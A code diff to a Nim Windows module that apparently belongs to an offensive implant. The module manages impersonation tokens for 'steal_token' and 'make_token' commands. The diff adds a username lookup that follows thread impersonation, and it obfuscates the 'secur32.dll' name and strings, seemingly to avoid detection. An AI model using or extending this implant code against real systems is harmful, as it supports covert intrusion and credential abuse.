@@ -1,8 +1,11 @@
-## Token Manager - Stores and manages impersonation tokens
-## Used by make_token, steal_token, and rev2self commands
-
 when defined(windows):
   import winim/lean
+  import std/widestrs
+  import ../utils/strenc
+  
+  # Import GetUserNameExW from Secur32.dll
+  proc GetUserNameExW(NameFormat: DWORD, lpNameBuffer: LPWSTR, nSize: ptr DWORD): WINBOOL 
+    {.importc, dynlib: obf("secur32.dll"), stdcall.}
   
   # Global token handle for impersonation
   var globalTokenHandle*: HANDLE = 0
@@ -22,6 +25,29 @@ when defined(windows):
     if globalTokenHandle != 0:
       CloseHandle(globalTokenHandle)
       globalTokenHandle = 0
+
+  proc getCurrentUsername*(): string =
+    ## Get the current username respecting thread impersonation
+    ## Uses GetUserNameExW which automatically respects thread tokens
+    const NameSamCompatible = 2.DWORD  # EXTENDED_NAME_FORMAT
+    
+    var nameLen: DWORD = 0
+    
+    # First call to get the required buffer size
+    discard GetUserNameExW(NameSamCompatible, nil, addr nameLen)
+    
+    if nameLen == 0:
+      return ""
+    
+    # Allocate buffer for the username
+    var nameBuffer = newWideCString("", nameLen)
+    
+    # Get the username
+    if GetUserNameExW(NameSamCompatible, cast[LPWSTR](nameBuffer[0].addr), addr nameLen) == 0:
+      return ""
+    
+    # Convert to string
+    result = $nameBuffer
 else:
   # Unix placeholders (not needed but required for compilation)
   type HANDLE* = int
